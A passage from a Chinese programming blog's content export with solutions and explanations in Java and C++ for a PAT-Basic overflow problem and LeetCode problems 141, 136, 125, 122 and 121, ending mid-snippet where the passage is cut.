1 2 3
2 3 4
2147483647 0 2147483646
0 -2147483648 -2147483647
</code></pre><p><strong>输出样例：</strong></p>
<pre><code>Case #1: false
Case #2: true
Case #3: true
Case #4: false
</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol>
<li>因为在给定区间 $[-2^{31},2^{31}]$判断，该区间右端点在int范围已经溢出，且$−2^{31}+(−2^{31}) = −2^{32}$也在<code>int</code>范围是溢出的，说明加数，和均会溢出。所以不能使用<code>int</code>类型存储输入数据，需要用<code>long long</code>类型来保证计算不会溢出。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app=PAT-Basic lang=c++</span></span><br><span class="line"><span class="comment"> * https://pintia.cn/problem-sets/994805260223102976/problems/994805312417021952</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> A, B, C,sum;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; T;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld%lld%lld"</span>,&amp;A,&amp;B,&amp;C);</span><br><span class="line">        sum = A + B;</span><br><span class="line">        <span class="keyword">if</span> (sum &gt; C)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Case #%d: true\n"</span>,i + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Case #%d: false\n"</span>, i + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>PAT</tag>
        <tag>PAT-Basic</tag>
      </tags>
  </entry>
  <entry>
    <title>141. Linked List Cycle</title>
    <url>/2017/06/19/141-Linked-List-Cycle/</url>
    <content><![CDATA[<p>Given a linked list, determine if it has a cycle in it.</p>
<p>Follow up:</p>
<p>Can you solve it without using extra space?</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>判断是不是环，可以使用快慢指针法：<br></p>
<ol>
<li>要么，指针可以达到尾，说明不是环。<br></li>
<li>要么，快指针会追到慢指针，说明形成环。<br></li>
</ol>
<p>P.S.</p>
<blockquote>
<p>注意使用 <code>do{}while{}</code> 循环简化代码。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123;</span></span><br><span class="line"><span class="comment"> *         val = x;</span></span><br><span class="line"><span class="comment"> *         next = null;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="keyword">null</span> || head.next==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode lowNode = head;</span><br><span class="line">        ListNode fastNode = head;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(lowNode!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                lowNode = lowNode.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(lowNode!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                lowNode = lowNode.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(fastNode!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                fastNode = fastNode.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(lowNode!=fastNode);</span><br><span class="line">        <span class="keyword">return</span> fastNode!=<span class="keyword">null</span> &amp;&amp; lowNode!=<span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>快慢指针的典型用法，用来判断是否为构成了环，同时，也应该记住他的另一个功能，用于查找链表中的中位数。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>快慢指针</tag>
      </tags>
  </entry>
  <entry>
    <title>136. Single Number</title>
    <url>/2017/06/19/136-Single-Number/</url>
    <content><![CDATA[<p>Given an array of integers, every element appears twice except for one. Find that single one.</p>
<p><strong>Note:</strong><br>Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?</p>
<p>Subscribe to see which companies asked this question</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><blockquote>
<p>这道题目其实可以通过排序后，遍历数组，然后得到结果。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">1</span>&amp;&amp;nums[i-<span class="number">1</span>]!=nums[i])</span><br><span class="line">                <span class="keyword">return</span> nums[i-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(nums.length%<span class="number">2</span>==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> nums[nums.length-<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>i%2==1</code> 取模操作，很好的解决了排序后每两个间不同的比较。</p>
</blockquote>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><blockquote>
<p>异或操作 <code>^</code> 是很好的去除相同元素的办法。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> res = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            res ^= nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>异或操作是一个很好的去重的方法，这一点在使用的时候很方便，应该在含有偶数个去重的问题中，能够及时联想到这个操作。</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>125. Valid Palindrome</title>
    <url>/2017/06/19/125-Valid-Palindrome/</url>
    <content><![CDATA[<p>Given a string, determine if it is a palindrome, considering only alphanumeric characters and ignoring cases.</p>
<p><strong>For example,</strong></p>
<p><code>&quot;A man, a plan, a canal: Panama&quot;</code> is a palindrome.<br><br><code>&quot;race a car&quot;</code> is not a palindrome.</p>
<p><strong>Note:</strong></p>
<p>Have you consider that the string might be empty? This is a good question to ask during an interview.</p>
<p>For the purpose of this problem, we define empty string as valid palindrome.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution 1"></a>Solution 1</h2><blockquote>
<p>使用正则表达式过滤。<code>[^a-zA-Z0-9]</code>，过滤非字符数字。</p>
<p>这样做的效率比较低，因为正则表达式创建了一个新的空间，空间复杂度为O(n)。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        s = s.replaceAll(<span class="string">"[^a-zA-Z0-9]"</span>,<span class="string">""</span>);</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>,j=s.length()-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=j)&#123;</span><br><span class="line">            <span class="keyword">if</span>(Character.toLowerCase(s.charAt(i)) != Character.toLowerCase(s.charAt(j)))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Optimized"><a href="#Optimized" class="headerlink" title="Optimized"></a>Optimized</h1><h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p>减少空间复杂度，直接判断，使用双指针和Character.isLetterOrDigit()方法，可以很方便的判断是否对称。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> high = s.length()-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">char</span> arr[] = s.toLowerCase().toCharArray();</span><br><span class="line">        <span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">            <span class="keyword">if</span>(Character.isLetterOrDigit(arr[low]) &amp;&amp; Character.isLetterOrDigit(arr[high]))&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[low] != arr[high])&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                low++;</span><br><span class="line">                high--;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(!Character.isLetterOrDigit(arr[low]))&#123;</span><br><span class="line">                    low++;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!Character.isLetterOrDigit(arr[high]))&#123;</span><br><span class="line">                    high--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这个题主要考察了对字符串中字符的操作，使用双指针方法是很不错的思路！</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>双指针</tag>
      </tags>
  </entry>
  <entry>
    <title>122. Best Time to Buy and Sell Stock II</title>
    <url>/2017/06/16/122-Best-Time-to-Buy-and-Sell-Stock-II/</url>
    <content><![CDATA[<p>Say you have an array <code>prices</code> for which the <em>i</em>th element is the price of a given stock on day <em>i</em>.</p>
<p>Design an algorithm to find the maximum profit. You may complete as many transactions as you like (i.e., buy one and sell one share of the stock multiple times).</p>
<p><strong>Note:</strong> You may not engage in multiple transactions at the same time (i.e., you must sell the stock before you buy again).</p>
<a id="more"></a>
<p><strong>Example 1:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">7</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>]</span><br><span class="line">Output: <span class="number">7</span></span><br><span class="line">Explanation: Buy on day <span class="number">2</span> (price = <span class="number">1</span>) and sell on day <span class="number">3</span> (price = <span class="number">5</span>), profit = <span class="number">5</span>-<span class="number">1</span> = <span class="number">4</span>.</span><br><span class="line">             Then buy on day <span class="number">4</span> (price = <span class="number">3</span>) and sell on day <span class="number">5</span> (price = <span class="number">6</span>), profit = <span class="number">6</span>-<span class="number">3</span> = <span class="number">3</span>.</span><br></pre></td></tr></table></figure>
<p><strong>Example 2:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">Output: <span class="number">4</span></span><br><span class="line">Explanation: Buy on day <span class="number">1</span> (price = <span class="number">1</span>) and sell on day <span class="number">5</span> (price = <span class="number">5</span>), profit = <span class="number">5</span>-<span class="number">1</span> = <span class="number">4</span>.</span><br><span class="line">             Note that you cannot buy on day <span class="number">1</span>, buy on day <span class="number">2</span> and sell them later, as you are</span><br><span class="line">             engaging multiple transactions at the same time. You must sell before buying again.</span><br></pre></td></tr></table></figure>
<p><strong>Example 3:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">7</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">Output: <span class="number">0</span></span><br><span class="line">Explanation: In <span class="keyword">this</span> <span class="keyword">case</span>, no transaction is done, i.e. max profit = <span class="number">0</span>.</span><br></pre></td></tr></table></figure>
<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= prices.length &lt;= 3 * 10 ^ 4</code></li>
<li><code>0 &lt;= prices[i] &lt;= 10 ^ 4</code></li>
</ul>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>详见：<a href="https://leetcode.com/articles/best-time-to-buy-and-sell-stock-ii/" target="_blank" rel="noopener">https://leetcode.com/articles/best-time-to-buy-and-sell-stock-ii/</a></p>
<p>这个题目其实有难度的，虽然直接利用贪心，可以很快的得到答案，但是这么做不是真的解决问题。<br>我看了答案，提供了三种解法：</p>
<h2 id="解法一（暴力法）-Time-Limit-Exceeded超时"><a href="#解法一（暴力法）-Time-Limit-Exceeded超时" class="headerlink" title="解法一（暴力法）-Time Limit Exceeded超时"></a>解法一（暴力法）-Time Limit Exceeded超时</h2><p>第一种是暴力解法，思路很实际，但是在数据较多的情况下，一定会超时，因为他本身利用了递归。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/best-time-to-buy-and-sell-stock-ii</span></span><br><span class="line"><span class="comment"> * Error:Time Limit Exceeded</span></span><br><span class="line"><span class="comment"> * Beats : 0 %;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> calculate(prices, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">calculate</span><span class="params">(<span class="keyword">int</span> prices[], <span class="keyword">int</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s &gt;= prices.length)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> start = s; start &lt; prices.length; start++) &#123;</span><br><span class="line">            <span class="keyword">int</span> maxprofit = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = start + <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (prices[start] &lt; prices[i]) &#123;</span><br><span class="line">                    <span class="keyword">int</span> profit = calculate(prices, i + <span class="number">1</span>) + prices[i] - prices[start];</span><br><span class="line">                    <span class="keyword">if</span> (profit &gt; maxprofit)</span><br><span class="line">                        maxprofit = profit;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (maxprofit &gt; max)</span><br><span class="line">                max = maxprofit;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个思路用了递归，相当于枚举了所有的情况，进而得出强行得出结果，优点是直接，但缺点也很明显，那就是效率很低。</p>
<h2 id="解法二-谷峰法"><a href="#解法二-谷峰法" class="headerlink" title="解法二-谷峰法"></a>解法二-谷峰法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/best-time-to-buy-and-sell-stock-ii</span></span><br><span class="line"><span class="comment"> * Beats : 93.55%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> valley = prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> peak = prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> maxprofit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; prices.length - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; prices.length - <span class="number">1</span> &amp;&amp; prices[i] &gt;= prices[i + <span class="number">1</span>])</span><br><span class="line">                i++;</span><br><span class="line">            valley = prices[i];</span><br><span class="line">            <span class="keyword">while</span> (i &lt; prices.length - <span class="number">1</span> &amp;&amp; prices[i] &lt;= prices[i + <span class="number">1</span>])</span><br><span class="line">                i++;</span><br><span class="line">            peak = prices[i];</span><br><span class="line">            maxprofit += peak - valley;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxprofit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>谷峰法的关键点在于：</p>
<blockquote>
<p>In case we skip one of the peaks (trying to obtain more profit), we will end up losing the profit over one of the transactions leading to an overall lesser profit.<br>如果我们跳过其中一个峰值(试图获得更多的利润)，我们最终将失去其中一个交易的利润，导致整体利润减少。</p>
</blockquote>
<h2 id="解法三-贪心"><a href="#解法三-贪心" class="headerlink" title="解法三-贪心"></a>解法三-贪心</h2><p>这个贪心其实是在上面谷峰法的基础上改进的，因为谷峰法是把每一段增长段都不能丢弃的全部计算到一起；而贪心则是这些增长段分割为最小段计算总和，虽然题目是不允许同日买进卖出，但其实我们只是在数学意义上进行转换，而不涉及实际操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/best-time-to-buy-and-sell-stock-ii</span></span><br><span class="line"><span class="comment"> * Beats : 93.55%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(prices.length==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> profit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;prices.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(prices[i]&gt;prices[i-<span class="number">1</span>])&#123;</span><br><span class="line">                profit += (prices[i]-prices[i-<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> profit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个题目关键是谷峰法，而贪心只是谷峰法的一个变化。</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
        <tag>贪心(Greedy)</tag>
      </tags>
  </entry>
  <entry>
    <title>121. Best Time to Buy and Sell Stock</title>
    <url>/2017/06/16/121-Best-Time-to-Buy-and-Sell-Stock/</url>
    <content><![CDATA[<p>Say you have an array for which the ith element is the price of a given stock on day i.</p>
<p>If you were only permitted to complete at most one transaction (ie, buy one and sell one share of the stock), design an algorithm to find the maximum profit.</p>
<p><strong>Example 1:</strong></p>
<pre><code>Input: [7, 1, 5, 3, 6, 4]
Output: 5
max. difference = 6-1 = 5 (not 7-1 = 6, as selling price needs to be larger than buying price)
</code></pre><p><strong>Example 2:</strong></p>
<pre><code>Input: [7, 6, 4, 3, 1]
Output: 0
In this case, no transaction is done, i.e. max profit = 0.
</code></pre><a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><blockquote>
<p>使用暴力方法解，怎么想怎么写，双层循环解决。<br>LeetCode: Time Limit Exceeded</p>
</blockquote>
<h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p>这道题，为什么会感觉很难做，因为逻辑没有搞清楚：</p>
<ol>
<li>什么时候卖出？只要当前利益比它最大收益大，就卖出（可惜不是预测。）</li>
</ol>
<p>什么时候买进？当前值小于上一次买进的值，就应该买进。</p>
<ol>
<li>什么时候买进？当前值小于上一次买进的值，就应该买进。</li>
</ol>
<p>总结：买进和卖出没有联系，卖出是买进前的最大利益，所以当输入[7, 6, 8, 3, 1]，虽然买进是1，但是获利最大是8-6=2，利润是2。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/best-time-to-buy-and-sell-stock/</span></span><br><span class="line"><span class="comment"> * Beats : 90 %;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(prices.length==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> profit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> buy = prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;prices.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(prices[i]-buy&gt;profit)&#123;</span><br><span class="line">                profit = prices[i] - buy;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(prices[i]&lt;buy)&#123;</span><br><span class="line">                    buy = prices[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> profit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><h3 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a><a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%AD%90%E5%BA%8F%E5%88%97" target="_blank" rel="noopener">最长公共子序列</a></h3><p>其实这类问题就是动态规划问题，动态规划问题，需要想清楚：</p>
<ol>
<li>如果设置一个数组，这个数组存储的是动态规划时的什么数据？这个数据决定当前节点，所得到的结果。</li>
<li>结果一定是通过之前创建的动态规划数组得到的。</li>
</ol>
<p>具体思路：</p>
<ol>
<li>设置一个数组，用作动态规划数组，这个数组优化后可以不要，但易于理解，脑子里要有他。</li>
<li>这个数组的意义：用于存放当前节点所能获取的最大利润，每次到当前节点都要计算他与买时的差值，如果是正数，则计入动态规划数组；如果是负值，则置为0，此外还应，看看是否比买入低，重置买入值。</li>
</ol>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/best-time-to-buy-and-sell-stock/</span></span><br><span class="line"><span class="comment"> * Beats : 100%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(prices.length==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> profit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;prices.length;i++)&#123;</span><br><span class="line">            profit += (prices[i] - prices[i-<span class="number">1</span>]);</span><br><span class="line">            profit = Math.max(<span class="number">0</span>,profit);</span><br><span class="line">            max = Math.max(max,profit);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/best-time-to-buy-and-sell-stock/</span></span><br><span class="line"><span class="comment"> * Beats : 100%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (prices.size() == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> buy = prices[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">int</span> profit = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; prices.size(); i++)&#123;</span><br><span class="line">			profit = prices[i] - buy&gt;profit ? prices[i] - buy : profit;</span><br><span class="line">			buy = prices[i] &lt; buy?prices[i]:buy;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> 